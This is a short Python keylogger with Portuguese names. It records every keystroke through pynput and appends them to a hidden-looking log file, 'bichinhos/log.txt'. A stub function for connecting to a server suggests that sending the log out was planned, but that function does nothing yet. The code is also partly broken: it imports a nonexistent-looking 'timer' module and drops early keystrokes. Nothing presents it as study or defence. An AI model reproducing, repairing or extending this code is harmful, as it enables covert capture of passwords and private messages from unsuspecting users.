import os
import re
import sys
import socket
import timer
from pynput.keyboard import Listener

arq = None

def escutar_tecla(tecla) -> None:
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub('Key.delete', '"Delete"\n', tecla)
    tecla = re.sub('Key.space', ' "Espaco" ', tecla)
    tecla = re.sub('Key.enter', '"Enter"\n', tecla)
    tecla = re.sub('Key.backspace', '"Backspace"', tecla)

    if (not os.path.exists("bichinhos")):
        os.makedirs("bichinhos")
        return

    if (not os.path.exists("bichinhos/log.txt")):
        arq = open("bichinhos/log.txt", "w")
        return
    
    arq = open("bichinhos/log.txt", "a")
    arq.write(tecla)

def conectar_servidor():
    protocolo = socket.IPPROTO_TCP
    comando = None
    if (os.name == "nt"):
        comando = "ipconfig"
    comando = "ifconfig"



with Listener(on_press=escutar_tecla) as escutador:
    escutador.join()